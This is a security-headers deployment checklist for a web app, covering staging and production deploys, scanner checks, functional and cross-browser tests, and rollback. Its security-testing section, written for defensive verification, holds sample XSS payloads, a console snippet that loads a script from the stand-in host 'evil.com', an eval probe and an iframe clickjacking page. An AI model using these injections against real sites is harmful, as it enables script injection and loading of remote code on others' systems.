# Security Headers Deployment Checklist

**Task:** S5-1: Configure Security Headers
**For:** Production deployment verification

## Pre-Deployment Checklist

- [x] Security headers configured in `public/_headers`
- [x] Documentation created (`docs/SECURITY_HEADERS_CONFIGURATION.md`)
- [x] Test script created (`scripts/test-security-headers.sh`)
- [x] Development headers verified in `vite.config.ts`
- [x] Meta CSP tags verified in `index.html` (fallback)
- [ ] Code review completed
- [ ] Security review completed

## Deployment Steps

### 1. Deploy to Staging

```bash
# Build production version
npm run build:production

# Deploy to staging (platform-specific)
# Example for Netlify:
netlify deploy --prod --dir=dist

# Example for Cloudflare Pages:
wrangler pages publish dist
```

- [ ] Staging deployment successful
- [ ] Deployment logs reviewed (no errors)

### 2. Verify Headers on Staging

**Option A: Using test script**
```bash
bash scripts/test-security-headers.sh https://staging.gracefulbooks.com
```

**Option B: Manual verification with curl**
```bash
curl -I https://staging.gracefulbooks.com
```

**Check for:**
- [ ] Content-Security-Policy present
- [ ] X-Frame-Options: DENY
- [ ] X-Content-Type-Options: nosniff
- [ ] X-XSS-Protection: 1; mode=block
- [ ] Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
- [ ] Referrer-Policy: strict-origin-when-cross-origin
- [ ] Permissions-Policy: geolocation=(), microphone=(), camera=()

### 3. Security Scanner Tests

**SecurityHeaders.com Scan**
- [ ] Visit https://securityheaders.com/
- [ ] Enter staging URL
- [ ] Target score: **A+**
- [ ] Screenshot saved for documentation
- [ ] No critical warnings

**Mozilla Observatory Scan**
- [ ] Visit https://observatory.mozilla.org/
- [ ] Enter staging URL
- [ ] Target score: **A+**
- [ ] Screenshot saved for documentation
- [ ] Review all recommendations

**CSP Evaluator**
- [ ] Visit https://csp-evaluator.withgoogle.com/
- [ ] Paste CSP policy
- [ ] Review findings
- [ ] No high-severity issues

### 4. Functional Testing

**Application Loading**
- [ ] Home page loads correctly
- [ ] No CSP violations in browser console
- [ ] All assets load (scripts, styles, images, fonts)
- [ ] No blocked resources in Network tab

**Authentication & Security**
- [ ] Login works correctly
- [ ] Session management works
- [ ] Logout works correctly
- [ ] Protected routes require authentication

**Core Features**
- [ ] Dashboard displays correctly
- [ ] Transaction creation works
- [ ] Transaction editing works
- [ ] Reports generate correctly
- [ ] Charts render (Recharts)
- [ ] PDF export works (jsPDF)
- [ ] CSV import/export works

**Advanced Features**
- [ ] Bank reconciliation works
- [ ] Invoice generation works
- [ ] Multi-user features work (if applicable)
- [ ] 3D visualizations work (if applicable)
- [ ] All modals/dialogs display correctly

### 5. Cross-Browser Testing

**Desktop Browsers**
- [ ] Chrome (latest) - Windows
- [ ] Chrome (latest) - macOS
- [ ] Firefox (latest) - Windows
- [ ] Firefox (latest) - macOS
- [ ] Safari (latest) - macOS
- [ ] Edge (latest) - Windows

**Mobile Browsers**
- [ ] Safari - iOS (latest)
- [ ] Chrome - Android (latest)
- [ ] Firefox - Android (latest)

**For each browser, verify:**
- Application loads and functions
- No console errors
- No CSP violations
- All features work as expected

### 6. Security Testing

**XSS Prevention**

Test that these attacks are blocked:

1. Inline script injection:
   ```javascript
   // Try to inject in a text field
   <img src=x onerror="alert('XSS')">
   ```
   - [ ] Attack blocked by CSP
   - [ ] No alert displayed
   - [ ] CSP violation logged in console

2. External script loading:
   ```javascript
   // Try in browser console
   const script = document.createElement('script');
   script.src = 'https://evil.com/malicious.js';
   document.body.appendChild(script);
   ```
   - [ ] Script blocked by CSP
   - [ ] CSP violation logged in console

3. Eval usage:
   ```javascript
   // Try in browser console
   eval('alert("XSS")');
   ```
   - [ ] Eval blocked by CSP (no unsafe-eval)
   - [ ] Error displayed in console

**Clickjacking Prevention**

Test that the application cannot be framed:

1. Create test HTML file:
   ```html
   <!DOCTYPE html>
   <html>
   <body>
     <iframe src="https://staging.gracefulbooks.com"></iframe>
   </body>
   </html>
   ```
   - [ ] Frame blocked (empty iframe)
   - [ ] Console shows X-Frame-Options violation

**HTTPS Enforcement**

- [ ] HTTP redirects to HTTPS
- [ ] HSTS header present
- [ ] No mixed content warnings
- [ ] All resources loaded over HTTPS

**Privacy Protection**

- [ ] Referrer not leaked to third parties (test with external link)
- [ ] No geolocation requests
- [ ] No camera/microphone access requests

### 7. Performance Testing

**With Security Headers Enabled**

Run performance tests and compare to baseline:

```bash
# Lighthouse performance audit
npm run lighthouse

# Load test
npm run load:test:light
```

- [ ] No significant performance regression (<5%)
- [ ] Page load time acceptable (<2s)
- [ ] Transaction save time acceptable (<500ms)
- [ ] Report generation time acceptable (<5s)

**Bundle Size**

```bash
npm run perf:bundle-size
```

- [ ] No unexpected bundle size increase
- [ ] Gzip compression working
- [ ] Brotli compression working (if available)

### 8. Monitoring Setup

**Error Monitoring**

- [ ] CSP violation reporting configured (if implementing)
- [ ] Error tracking service configured (Sentry, etc.)
- [ ] Alert thresholds set for security events

**Analytics**

- [ ] Analytics working with Referrer-Policy
- [ ] Internal navigation tracked
- [ ] External referrers properly filtered

### 9. Production Deployment

**Final Checks Before Production**
- [ ] All staging tests passed
- [ ] Security scans show A+ rating
- [ ] No critical issues identified
- [ ] Stakeholder approval obtained
- [ ] Deployment plan reviewed

**Deploy to Production**

```bash
# Build production version
npm run build:production

# Deploy to production (platform-specific)
# Example for Netlify:
netlify deploy --prod --dir=dist

# Example for Cloudflare Pages:
wrangler pages publish dist --branch=main
```

- [ ] Production deployment successful
- [ ] Deployment logs reviewed

**Post-Deployment Verification**

Repeat tests on production URL:

- [ ] Run security headers test script
- [ ] Run SecurityHeaders.com scan
- [ ] Run Mozilla Observatory scan
- [ ] Functional testing
- [ ] Cross-browser testing (spot check)
- [ ] Security testing (spot check)

### 10. Documentation & Communication

**Update Documentation**
- [ ] Mark S5-1 as COMPLETED in `SECURITY_HARDENING_ROADMAP.md`
- [ ] Update deployment documentation with header configuration
- [ ] Add security headers info to README if applicable
- [ ] Document any deviations from plan

**Communication**
- [ ] Notify team of deployment
- [ ] Share security scan results
- [ ] Document lessons learned
- [ ] Update runbook with any new procedures

## Post-Deployment Monitoring

**First 24 Hours**

Monitor for:
- [ ] CSP violations (if reporting enabled)
- [ ] Error rate increase
- [ ] User-reported issues
- [ ] Performance degradation
- [ ] Browser compatibility issues

**First Week**

- [ ] Review security logs
- [ ] Review error reports
- [ ] Gather user feedback
- [ ] Monitor analytics for anomalies

**First Month**

- [ ] Re-run security scans
- [ ] Review CSP violations (adjust if needed)
- [ ] Evaluate header effectiveness
- [ ] Plan for HSTS preload submission (if ready)

## Rollback Plan

**If Critical Issues Arise**

1. **Identify the issue:**
   - Application not loading?
   - Features broken?
   - Security issue?

2. **Quick fix if possible:**
   - Adjust CSP policy for legitimate resources
   - Remove problematic header temporarily
   - Redeploy with fix

3. **Full rollback if needed:**
   ```bash
   # Rollback to previous deployment
   netlify rollback  # or platform-specific command
   ```

4. **Post-rollback:**
   - Investigate root cause
   - Test fix in staging
   - Redeploy when ready

## Success Criteria

This task (S5-1) is considered **COMPLETE** when:

- [x] Security headers configured in `public/_headers`
- [x] Documentation created
- [x] Test script created
- [ ] Deployed to staging
- [ ] SecurityHeaders.com scan shows **A+ rating**
- [ ] Mozilla Observatory scan shows **A+ rating**
- [ ] All functional tests pass
- [ ] Cross-browser testing complete
- [ ] Security testing complete
- [ ] Deployed to production
- [ ] Post-deployment verification complete
- [ ] Task marked COMPLETED in roadmap

## Notes

**Date Started:** 2026-02-23
**Date Deployed (Staging):** _____
**Date Deployed (Production):** _____
**Final Security Rating:** _____
**Issues Encountered:** _____
**Lessons Learned:** _____

## References

- **Main Documentation:** `docs/SECURITY_HEADERS_CONFIGURATION.md`
- **Roadmap:** `Roadmaps/SECURITY_HARDENING_ROADMAP.md` (lines 759-794)
- **Test Script:** `scripts/test-security-headers.sh`
- **Configuration File:** `public/_headers`

---

**Checklist Owner:** DevOps/Security Team
**Last Updated:** 2026-02-23
